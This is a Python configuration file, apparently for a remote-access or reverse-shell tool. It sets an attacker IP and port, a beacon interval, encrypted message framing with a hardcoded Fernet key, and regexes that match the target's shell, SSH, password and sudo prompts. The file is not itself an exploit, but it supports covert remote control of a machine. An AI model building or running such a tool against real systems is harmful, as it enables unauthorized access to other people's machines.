# Contains settings and constants for files

# !!!--- EDIT THESE VALUES ----!!!

# CONFIGURE THESE VALUES TO FIT IPS
ATTACKER_IP = '10.0.2.4'
PORT_NUMBER = 4321 # port used by server machine 

# Sleep Time
SLEEP_TIME = 10 # number of seconds target machine will wait between making calls to the attacker machine

# Message length constants (minimum and maximum allowed message size to be sent between the machines)
MIN_MESSAGE_LENGTH = 128 # smallest message size sent from my testing
MAX_MESSAGE_LENGTH = 2**24 # Increase if too small 

# amount of time that the expect function in pexpect library will attempt to look for a string matching a pattern in TARGET_SHELL_PROMPT_REGEX_LIST
# pexcept parses super large outputs very slowly, so if connection is breaking when attempting to print some large output, increase this value (this will give expect more time to go through the large output)
EXPECT_TIMEOUT = 120 # time in seconds

# list of allowed message lengths (please only input up to 10 sizes in ascending order)
fixed_message_length_list = [MIN_MESSAGE_LENGTH, 256, 512, 1024, 2048, 4096, 8192, 2**15, 2**18, MAX_MESSAGE_LENGTH]

# Symmetric Key
SYMMETRIC_KEY = b'NWUn3HPURE16A6nrJaGqxyGi21TK5Bvgx3VEroafa94=' # generated using Fernet.generate_key() (from cryptography.fernet import Fernet)


# !!!--- LEAVE BELOW ALONE ---!!!

TARGET_SHELL_PROMPT_REGEX_LIST = ['\[.+@.+ [\s\S]+\][#\$]', 'The authenticity of host [\s\S]+Are you sure you want to continue connecting \(yes/no\)\?', '.+@.+ password:', '\[sudo\] password for .+:', 'rm: remove [\s\S]+ file [\s\S]+\?']

# [\u@\h \W]\$

# This creates a dict where the keys are the indices and the values are the message length that corresponds to that index. The type of the keys are characters instead of ints
message_type_to_length = dict((str(k), v) for k, v in enumerate(fixed_message_length_list))
# This table allows us to look up how long the message sent by the socket is just by looking at the first character sent by the socket (which should be one of the indices that correspond with a message length)
# # Reason for having this is so that we can make the messages a fixed length 
# # (which will allow us to use the same one socket for messages back and forth instead of destroying the socket after one message after sending 0 bytes)
# # but also allow us to send messages of arbitrary length (which can be done by adding more entries into the lookup table)

message_length_to_type = dict((v, k) for k, v in message_type_to_length.items()) # flips keys and values of message_type_to_length dict